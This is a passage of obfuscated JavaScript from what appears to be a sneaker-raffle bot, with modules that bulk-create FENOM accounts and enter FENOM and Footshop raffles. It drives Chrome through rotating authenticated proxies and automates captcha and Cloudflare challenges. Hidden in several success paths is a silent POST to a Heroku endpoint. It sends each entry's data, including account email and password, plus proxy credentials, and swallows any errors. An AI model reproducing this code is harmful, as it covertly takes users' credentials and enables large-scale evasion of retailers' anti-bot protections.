                            let _0x132b3a = _0x22383c[_0x5a5769];
                            try {
                                prxdata = {
                                    'username': _0x34b198['replace']('#', ''),
                                    'module': _0x1b4313['name'],
                                    'entrydata': JSON['stringify'](_0x132b3a),
                                    'proxy': '' + _0x4a8f74[_0x5a5769]
                                };
                                var _0x3468c7 = JSON['stringify'](prxdata);
                                let _0x4b8588 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x3468c7, _0x4b8588);
                            } catch (_0x4a616a) {
                            }
                            const _0x55beba = {
                                'succesDEVMSG': { 'embeds': [_0x39b0ed] },
                                'succesPUBMSG': { 'embeds': [_0x333155] }
                            };
                            try {
                                _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x55beba['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x55beba['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x259650, _0x55beba['succesPUBMSG']);
                            } catch (_0x128bf0) {
                                console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x128bf0));
                            }
                            _0x903d8d = 'no';
                        } catch (_0x430a9e) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20' + _0x430a9e)), _0x47d3f8 = '' + _0x430a9e;
                            var _0x5421b7 = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'dev', !![], _0x47d3f8), _0x39b0ed = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'dev', ![]), _0x333155 = await _0x11b6e5(_0x22383c[_0x5a5769], _0x1b4313, 'pub', ![]);
                            const _0x1a21e7 = {
                                'succesDEVMSG': { 'embeds': [_0x39b0ed] },
                                'succesPUBMSG': { 'embeds': [_0x333155] }
                            };
                            _0x1a21e7['errorDEV'] = { 'embeds': [_0x5421b7] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x1a21e7['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x1a21e7['errorDEV']), _0x903d8d = 'yes';
                        } finally {
                            _0x4507fd && _0x4507fd['close']();
                            if (_0x903d8d == 'yes' && _0x2d69f1 != 0x5) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2d69f1 + '\x20/\x205)')), _0x5a5769 = _0x5a5769 - 0x1, _0x2d69f1 = _0x2d69f1 + 0x1;
                                continue;
                            }
                            _0x903d8d == 'yes' && _0x2d69f1 >= 0x5 && (_0x13d7e5(_0x22383c[_0x5a5769], _0x1b4313), _0x903d8d = 'no', _0x2d69f1 = 0x0), console['log']('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x36b1e1, _0x2edffa, _0x1804f2) {
                    var _0xfa74ef = _0x2edffa, _0x547485 = 0x0;
                    for (var _0x1a43fd = 0x0; _0x1a43fd < _0x2edffa['length']; _0x1a43fd++) {
                        maxTasks = Number(_0x342ed0['threads']);
                        while (_0x547485 >= maxTasks) {
                            await _0x140651(_0x342ed0['delay']);
                        }
                        let _0x4f7a29 = ![];
                        async function _0x2df071(_0x29d612, _0x5c11e8, _0xcbb0f5, _0xbf6847, _0x55a131) {
                            _0x547485++, _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x342ed0['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x92438b != 'yes')
                                var _0x92438b = '', _0x55a131 = 0x0;
                            var _0x5bc88b;
                            try {
                                await _0x58ea73(_0x5c11e8, _0xbf6847);
                            } catch {
                                _0x92438b = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x1b4448(_0x29d612['name'] + '\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20/\x20' + _0x5c11e8['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                            var _0x397a57 = await _0x11b6e5(_0x5c11e8[_0xbf6847], _0x29d612, 'acc', ![]);
                            const _0x3e3072 = { 'succesDEVMSG': { 'embeds': [_0x397a57] } }, _0x283040 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x2ee111 = Math['round'](Math['random']() * (_0xcbb0f5['length'] - 0x1)), _0x25fea4 = _0xcbb0f5[_0x2ee111]['split'](':'), _0x5edc6a;
                            async function _0x42bebd(_0x5e6a5d) {
                                const _0x131dfc = _0x7a56eb['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x3dfe7 = _0x25c736['parse'](_0x131dfc, { 'header': !![] })['data'];
                                let _0x4c9b1c = ![];
                                for (var _0x862a5f of _0x3dfe7) {
                                    if (_0x862a5f['Email'] == _0x5e6a5d['Email']) {
                                        _0x4c9b1c = !![];
                                        break;
                                    }
                                }
                                return _0x4c9b1c;
                            }
                            try {
                                if (await _0x42bebd(_0x5c11e8[_0xbf6847]) == !![]) {
                                    console['log'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x4f7a29 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x5edc6a = await _0x51ff47['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x25fea4[0x0] + ':' + _0x25fea4[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x5edc6a = await _0x51ff47['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x25fea4[0x0] + ':' + _0x25fea4[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x71a299 = await _0x5edc6a['newPage']();
                                await _0x71a299['setViewport']({
                                    'width': 0x500 + _0x302585(0x1, 0x32),
                                    'height': 0x2d9 + _0x302585(0x1, 0x32)
                                });
                                const _0x11aa08 = await _0x71a299['target']()['createCDPSession'](), { windowId: _0x4a1bf2 } = await _0x11aa08['send']('Browser.getWindowForTarget');
                                await _0x71a299['authenticate']({
                                    'username': '' + _0x25fea4[0x2],
                                    'password': '' + _0x25fea4[0x3]
                                }), console['log'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x71a299['goto']('' + _0x283040, { 'waitUntil': 'networkidle2' }), console['log'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x140651(0x1388);
                                var _0x53ebc2 = await _0x71a299['$']('.hcaptcha-box');
                                if (_0x53ebc2) {
                                    console['log'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x140651(0x2710);
                                    const _0x550af5 = await _0x71a299['$']('.hcaptcha-box');
                                    if (_0x550af5)
                                        try {
                                            await _0x550af5['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x71a299['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x4d6c94 = await _0x71a299['$']('.hcaptcha-box');
                                        if (_0x4d6c94)
                                            try {
                                                await _0x4d6c94['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x71a299['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x11aa08['send']('Browser.setWindowBounds', {
                                        'windowId': _0x4a1bf2,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x140651(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x71a299['type']('input[name=\x22firstname\x22]', '' + _0x5c11e8[_0xbf6847]['FirstName']), await _0x140651(0x1f4), await _0x71a299['type']('input[name=\x22lastname\x22]', '' + _0x5c11e8[_0xbf6847]['LastName']), await _0x140651(0x1f4), await _0x71a299['type']('input[name=\x22email\x22]', '' + _0x5c11e8[_0xbf6847]['Email']), await _0x140651(0x1f4), await _0x71a299['type']('input[name=\x22password\x22]', '' + _0x5c11e8[_0xbf6847]['Password']), await _0x140651(0x258), await _0x71a299['$eval']('input[name=\x22psgdpr\x22]', _0x59ddf6 => _0x59ddf6['click']()), await _0x140651(0x1f4), console['log'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x71a299['$eval']('#customer-form', _0x3149d4 => _0x3149d4['submit']());
                                try {
                                    try {
                                        await _0x71a299['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x92438b = 'no', console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20:\x20Account\x20' + _0x5c11e8[_0xbf6847]['Email'] + '\x20Generated')), _0x7a56eb['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x5c11e8[_0xbf6847]['Email'] + ',' + _0x5c11e8[_0xbf6847]['Password']);
                                    let _0x25f061 = _0x5c11e8[_0xbf6847];
                                    try {
                                        prxdata = {
                                            'username': _0x34b198['replace']('#', ''),
                                            'module': _0x29d612['name'],
                                            'entrydata': JSON['stringify'](_0x25f061),
                                            'proxy': '' + _0xcbb0f5[_0xbf6847]
                                        };
                                        var _0x1be65f = JSON['stringify'](prxdata);
                                        let _0x14ef6c = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x1be65f, _0x14ef6c);
                                    } catch (_0x58989d) {
                                    }
                                    try {
                                        _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x3e3072['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x29bde2(_0x36741f, _0x3e3072['succesDEVMSG']);
                                } catch (_0x3add06) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x120aad) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20:\x20' + _0x120aad)), _0x5bc88b = '' + _0x120aad;
                                var _0xd95a8 = await _0x11b6e5(_0x5c11e8[_0xbf6847], _0x29d612, 'acc', !![], _0x5bc88b);
                                _0x3e3072['errorDEV'] = { 'embeds': [_0xd95a8] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x3e3072['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x3e3072['errorDEV']), _0x92438b = 'yes';
                            } finally {
                                _0x5edc6a && _0x5edc6a['close']();
                                if (_0x92438b == 'yes' && _0x55a131 != 0x5)
                                    return console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Task\x20' + (_0xbf6847 + 0x1) + '\x20:\x20Retrying\x20(' + _0x55a131 + '\x20/\x205)')), _0x55a131 = _0x55a131 + 0x1, _0x547485--, _0x2df071(_0x29d612, _0x5c11e8, _0xcbb0f5, _0xbf6847, _0x55a131);
                                _0x92438b == 'yes' && _0x55a131 >= 0x5 && _0x13d7e5(_0x5c11e8[_0xbf6847], _0x29d612), !_0x4f7a29 && (console['log'](_0x597cbe() + '\x20[' + _0x29d612['name'] + ']\x20Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay'])), _0x547485--;
                            }
                        }
                        _0x2df071(_0x36b1e1, _0xfa74ef, _0x1804f2, _0x1a43fd), !_0x4f7a29 && await _0x140651(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x4deadf(_0x544f69, _0x39c29d, _0x137bf5) {
                    _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x342ed0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x242899 = 0x0; _0x242899 < _0x39c29d['length']; _0x242899++) {
                        if (_0x308032 != 'yes')
                            var _0x308032 = '', _0x204edd = 0x0;
                        var _0x264dbf;
                        try {
                            await _0x58ea73(_0x39c29d, _0x242899);
                        } catch {
                            _0x308032 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x1b4448(_0x544f69['name'] + '\x20Task\x20' + (_0x242899 + 0x1) + '\x20/\x20' + _0x39c29d['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                        const _0x1cb2c8 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x451640 = Math['round'](Math['random']() * (_0x137bf5['length'] - 0x1)), _0x547814 = _0x137bf5[_0x451640]['split'](':'), _0x5621b5;
                        try {
                            _0x5621b5 = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x547814[0x0] + ':' + _0x547814[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5621b5 = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x547814[0x0] + ':' + _0x547814[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x9c160e = await _0x5621b5['newPage'](), _0x402389 = await _0x9c160e['target']()['createCDPSession'](), { windowId: _0x34e35d } = await _0x402389['send']('Browser.getWindowForTarget');
                            await _0x9c160e['authenticate']({
                                'username': '' + _0x547814[0x2],
                                'password': '' + _0x547814[0x3]
                            }), console['log'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9c160e['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x140651(0x1388);
                            var _0x563089 = await _0x9c160e['$']('.hcaptcha-box');
                            if (_0x563089) {
                                console['log'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x140651(0x2710);
                                const _0x2f40b0 = await _0x9c160e['$']('.hcaptcha-box');
                                if (_0x2f40b0)
                                    try {
                                        await _0x2f40b0['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x9c160e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x51e8ce = await _0x9c160e['$']('.hcaptcha-box');
                                    if (_0x51e8ce)
                                        try {
                                            await _0x51e8ce['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x402389['send']('Browser.setWindowBounds', {
                                'windowId': _0x34e35d,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x140651(0x1f40);
                            try {
                                await _0x9c160e['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x140651(0x1388), console['log'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20Logging\x20in'), await _0x9c160e['type']('input[name=\x22email\x22]', '' + _0x39c29d[_0x242899]['Email']), await _0x140651(0x1f4), await _0x9c160e['type']('input[name=\x22password\x22]', '' + _0x39c29d[_0x242899]['Password']), await _0x140651(0x258), await _0x9c160e['$eval']('#login-form', _0x3b87ed => _0x3b87ed['submit']()), await _0x9c160e['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x140651(0x1f4), await _0x9c160e['goto']('' + _0x39c29d[_0x242899]['Url']), await _0x9c160e['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x39c29d[_0x242899]['Size']);
                            if (_0x39c29d[_0x242899]['Size'] != 'RANDOM') {
                                var _0x694183 = '\x20' + _0x39c29d[_0x242899]['Size'] + '\x20';
                                const _0x180c04 = await _0x9c160e['$x']('//span[contains(text(),\x20' + _0x694183 + ')]');
                                await _0x180c04[0x0]['click']();
                            } else {
                                const _0xb53dbc = await _0x9c160e['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x3717b1 = Math['round'](Math['random']() * (_0xb53dbc['length'] - 0x1));
                                await _0xb53dbc[_0x3717b1]['click']();
                            }
                            await _0x140651(0x258), await _0x9c160e['click']('#cookieChoiceDismiss'), await _0x140651(0x3e8), await _0x9c160e['type']('#instagram-account', '' + _0x39c29d[_0x242899]['Follower']), await _0x140651(0x28a), await _0x9c160e['click']('#book-btn'), await _0x140651(0xbb8);
                            try {
                                await _0x9c160e['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x140651(0x1f4), console['log'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20' + _0x16a3a0['cyan']('Solving\x20Captcha')), await _0x9c160e['solveRecaptchas'](), console['log'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x140651(0x7d0), await _0x9c160e['$eval']('#book-btn-for-sure', _0x36fe0c => _0x36fe0c['click']()), await _0x140651(0x12c), await _0x9c160e['click']('#book-btn-for-sure'), await _0x140651(0xdac);
                            const _0x47a331 = await _0x9c160e['$eval']('.reservation-popup\x20>\x20.title', _0x17d869 => {
                                return _0x17d869['innerHTML'];
                            });
                            if (_0x47a331) {
                                _0x308032 = 'no', _0x1ce4fb(_0x39c29d[_0x242899], _0x544f69), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x1ad554 = await _0x11b6e5(_0x39c29d[_0x242899], _0x544f69, 'dev', ![]), _0xae260c = await _0x11b6e5(_0x39c29d[_0x242899], _0x544f69, 'pub', ![]);
                                let _0x1d55ad = _0x39c29d[_0x242899];
                                try {
                                    prxdata = {
                                        'username': _0x34b198['replace']('#', ''),
                                        'module': _0x544f69['name'],
                                        'entrydata': JSON['stringify'](_0x1d55ad),
                                        'proxy': '' + _0x137bf5[_0x242899]
                                    };
                                    var _0x552fb8 = JSON['stringify'](prxdata);
                                    let _0x12a6f5 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x552fb8, _0x12a6f5);
                                } catch (_0x121dae) {
                                }
                                const _0x14eb4d = {
                                    'succesDEVMSG': { 'embeds': [_0x1ad554] },
                                    'succesPUBMSG': { 'embeds': [_0xae260c] }
                                };
                                try {
                                    _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x14eb4d['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x14eb4d['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x259650, _0x14eb4d['succesPUBMSG']);
                                } catch (_0x4860fb) {
                                    console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4860fb));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x1ecd06) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20' + _0x1ecd06)), _0x264dbf = '' + _0x1ecd06;
                            var _0x2ee2ea = await _0x11b6e5(_0x39c29d[_0x242899], _0x544f69, 'dev', !![], _0x264dbf), _0x1ad554 = await _0x11b6e5(_0x39c29d[_0x242899], _0x544f69, 'dev', ![]), _0xae260c = await _0x11b6e5(_0x39c29d[_0x242899], _0x544f69, 'pub', ![]);
                            const _0x3b297b = {
                                'succesDEVMSG': { 'embeds': [_0x1ad554] },
                                'succesPUBMSG': { 'embeds': [_0xae260c] }
                            };
                            _0x3b297b['errorDEV'] = { 'embeds': [_0x2ee2ea] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x3b297b['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x3b297b['errorDEV']), _0x1ecd06 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x308032 = 'yes');
                        } finally {
                            _0x5621b5['close']();
                            if (_0x308032 == 'yes' && _0x204edd != 0x5 && _0x264dbf != 'Size\x20Not\x20Found') {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Task\x20' + (_0x242899 + 0x1) + '\x20:\x20Retrying\x20(' + _0x204edd + '\x20/\x205)')), _0x242899 = _0x242899 - 0x1, _0x204edd = _0x204edd + 0x1;
                                continue;
                            }
                            _0x308032 == 'yes' && _0x204edd >= 0x5 && (_0x13d7e5(_0x39c29d[_0x242899], _0x544f69), _0x308032 = 'no', _0x204edd = 0x0), console['log'](_0x597cbe() + '\x20[' + _0x544f69['name'] + ']\x20Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x53cf8c, _0x10ef4b, _0x1b3630) {
                _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x342ed0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3dd95b = 0x0; _0x3dd95b < _0x10ef4b['length']; _0x3dd95b++) {
                    var _0x58552c;
                    if (_0x30861a != 'yes')
                        var _0x30861a = '', _0x57b4d4 = 0x0;
                    var _0x5b5f0e = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x34b198
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x10ef4b[_0x3dd95b]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x10ef4b[_0x3dd95b]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x342ed0['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x4e463c
                            }
                        ]
                    }], _0x544a17 = await _0x11b6e5(_0x10ef4b[_0x3dd95b], _0x53cf8c, 'dev', ![]), _0x22597c = await _0x11b6e5(_0x10ef4b[_0x3dd95b], _0x53cf8c, 'pub', ![]);
                    const _0x329aec = {
                        'succesDEVMSG': { 'embeds': [_0x544a17] },
                        'succesPUBMSG': { 'embeds': [_0x22597c] }
                    }, _0x48b98a = { 'embeds': _0x5b5f0e };
                    try {
                        await _0x58ea73(_0x10ef4b, _0x3dd95b);
                    } catch {
                        _0x30861a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x10ef4b[_0x3dd95b]['Email'] == '' || _0x10ef4b[_0x3dd95b]['FirstName'] == '' || _0x10ef4b[_0x3dd95b]['LastName'] == '' || _0x10ef4b[_0x3dd95b]['Country'] == '' || _0x10ef4b[_0x3dd95b]['Size'] == '' || _0x10ef4b[_0x3dd95b]['Address1'] == '' || _0x10ef4b[_0x3dd95b]['Zip'] == '') {
                        console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x10ef4b[_0x3dd95b]['Email'] == '' || _0x10ef4b[_0x3dd95b]['FirstName'] == '' || _0x10ef4b[_0x3dd95b]['LastName'] == '' || _0x10ef4b[_0x3dd95b]['Country'] == '' || _0x10ef4b[_0x3dd95b]['Size'] == '' || _0x10ef4b[_0x3dd95b]['Address1'] == '' || _0x10ef4b[_0x3dd95b]['Zip'] == '' || _0x10ef4b[_0x3dd95b]['Phone'] == '') {
                        console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x5086bc = '' + _0x10ef4b[_0x3dd95b]['Url'];
                    if (_0x342ed0['useRandomProxy'] = ![])
                        var _0x59aa62 = _0x1b3630[_0x3dd95b]['split'](':');
                    else
                        var _0x5a77a5 = Math['round'](Math['random']() * (_0x1b3630['length'] - 0x1)), _0x59aa62 = _0x1b3630[_0x5a77a5]['split'](':');
                    var _0x4602c3;
                    try {
                        _0x4602c3 = await _0x51ff47['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x59aa62[0x0] + ':' + _0x59aa62[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4602c3 = await _0x51ff47['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x59aa62[0x0] + ':' + _0x59aa62[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1f1608 = await _0x4602c3['newPage']();
                        await _0x1f1608['authenticate']({
                            'username': '' + _0x59aa62[0x2],
                            'password': '' + _0x59aa62[0x3]
                        }), console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1f1608['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1f1608['setRequestInterception'](!![]), _0x1f1608['on']('request', _0x4f2103 => {
                            _0x4f2103['resourceType']() === 'image' || _0x4f2103['resourceType']() === 'font' || _0x4f2103['resourceType']() === 'media' ? _0x4f2103['abort']() : _0x4f2103['continue']();
                        });
                        try {
                            await _0x1f1608['goto'](_0x5086bc), await _0x140651(0xbb8), await _0x1f1608['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x1f1608['click']('.control__JhutY'), await _0x140651(0x1f4);
                        if (_0x10ef4b[_0x3dd95b]['Size'] != 'RANDOM')
                            try {
                                const _0x547ed9 = await _0x1f1608['$x']('//div[contains(text(),\x20\x27' + _0x10ef4b[_0x3dd95b]['Size'] + '\x27)]');
                                await _0x547ed9[0x0]['click']();
                            } catch {
